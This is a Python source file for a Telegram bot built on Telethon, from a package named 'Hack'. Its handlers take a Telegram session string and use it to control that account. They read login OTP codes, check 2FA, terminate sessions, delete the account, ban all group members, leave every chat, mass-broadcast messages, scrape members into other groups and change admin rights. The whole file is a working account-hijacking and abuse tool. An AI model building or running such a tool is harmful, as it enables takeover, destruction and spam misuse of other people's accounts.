import os
import re

from telethon import events

from Hack import bot, botname
from Hack.helpers import on_callback, BROADCAST_BUTTONS, BROADCAST_OPTION, MENU1, MENU2, KEYBOARD1, KEYBOARD2
from Hack.functions import (
    check_string,
    get_dialogs,
    userchannels,
    userinfo,
    ban_all,
    ask_id,
    otp_searcher,
    joingroup,
    leavegroup,
    delgroup,
    user2fa,
    terminate,
    leave_all,
    delacc,
    ask_broadcast_message,
    broadcast,
    logout,
    invite_all,
    edit_admin
)

# Menu edits


@bot.on(events.CallbackQuery(data=re.compile(r'next|back')))
async def _edit(e):
    if e.data == b'next':
        await e.edit(MENU2, buttons=KEYBOARD2)
    else:
        await e.edit(MENU1, buttons=KEYBOARD1)


# Main Hack Funcs

@on_callback(data='A')
async def a(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        channels = await userchannels(string)
        if len(channels) == 0:
            await x.send_message("There is no channel created by this user\n\nThanks For using this bot")
        elif len(channels) > 2000:
            file_name = f"{e.chat_id}_session.txt"
            with open(file_name, "w") as f:
                f.write(channels + f"\n\nDetails BY @{botname}")
            await bot.send_file(e.chat_id, file_name)
            os.system(f"rm -rf {file_name}")
        else:
            await x.send_message(channels + "\n\nThanks For using this bot")


@on_callback(data='B')
async def b(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        info = await userinfo(string)
        await x.send_message(info)


@on_callback(data='C')
async def c(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return

        grp_id = await ask_id(x)
        if not grp_id:
            return

        result = await ban_all(string, grp_id, x)
        await x.send_message(result)


@on_callback(data='D')
async def d(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        result = await otp_searcher(string)
        await x.send_message(result)


@on_callback(data='E')
async def e(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        grp_name = await ask_id(
            x, text='Please send Group/Channel Username or Invite Link')
        if not grp_name:
            return
        result = await joingroup(string, grp_name)
        await x.send_message(result)


@on_callback(data='F')
async def f(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        grp_name = await ask_id(
            x, text='Please send Group/Channel Username or ID')
        if not grp_name:
            return
        result = await leavegroup(string, grp_name)
        await x.send_message(result)


@on_callback(data='G')
async def g(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        grp_name = await ask_id(x)
        if not grp_name:
            return
        result = await delgroup(string, grp_name)
        await x.send_message(result)


@on_callback(data='H')
async def h(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        result = await user2fa(string)
        await x.send_message(result)


@on_callback(data='I')
async def i(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        result = await terminate(string)
        await x.send_message(result)


@on_callback(data='J')
async def j(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        result = await delacc(string)
        await x.send_message(result)


@on_callback(data='K')
async def k(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        dialogs = await get_dialogs(string, group=True, channel=True)
        text = f"**Total Group/Channel: __{len(dialogs)}__\nExpected Time: __{len(dialogs)*1.5}__ seconds**"
        msg = await x.send_message(text)
        result = "**Successfully Left: __{}__\nRemaining Chats: __{}__**\n\nThanks For Using This Bot"
        left = await leave_all(string, dialogs=dialogs)
        await msg.edit(result.format(left, len(dialogs) - left))


@on_callback(data='L')
async def l(e):
    async with bot.conversation(e.chat_id) as x:
        await x.send_message("Choose the Broadcast Type",
                             buttons=BROADCAST_BUTTONS)


@on_callback(data=re.compile(r'[123]'))
async def _123(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        broadcast_msg = await ask_broadcast_message(x)
        if not broadcast_msg:
            return
        params = BROADCAST_OPTION.get(e.data)
        dialogs = await get_dialogs(string, **params)
        TEXT = f"**Total Chats: __{len(dialogs)}__\nExpected Time: __{len(dialogs)*2}__ seconds**"
        MSG = "**Successfull Chats: __{}__\nChats Failed: __{}__**\n\nThanks For Using This Bot"
        await x.send_message(TEXT)
        sent = await broadcast(string, ids=dialogs, msg=broadcast_msg)
        await x.send_message(MSG.format(sent, len(dialogs) - sent))


@on_callback(data='M')
async def m(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        result = await logout(string)
        if not result:
            return await x.send_message(
                "Logout Failed\n\nThanks For Using This Bot")
        await x.send_message("Logging Out\n\nThanks For Using This Bot")


@on_callback(data='N')
async def n(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return
        from_grp = await ask_id(
            x, text='Please Send The Group Id You Want Scrap From')
        if not from_grp:
            return

        to_grp = await ask_id(
            x, text='Please Send The Group Id You Want Scrap To')
        if not to_grp:
            return
        await invite_all(string, from_grp, to_grp, x)


@on_callback(data=re.compile(r'[OP]'))
async def o(e):
    async with bot.conversation(e.chat_id) as x:
        string = await check_string(x)
        if not string:
            return

        chat_id = await ask_id(x)
        if not chat_id:
            return

        user_id = await ask_id(x, text='Please send the user id/username')
        if not user_id:
            return

        if e.data == b'O':
            result = await edit_admin(string, x, demote=True, chat_id=chat_id, user_id=user_id)
        else:
            result = await edit_admin(string, x, promote=True, chat_id=chat_id, user_id=user_id)

        await x.send_message(result)
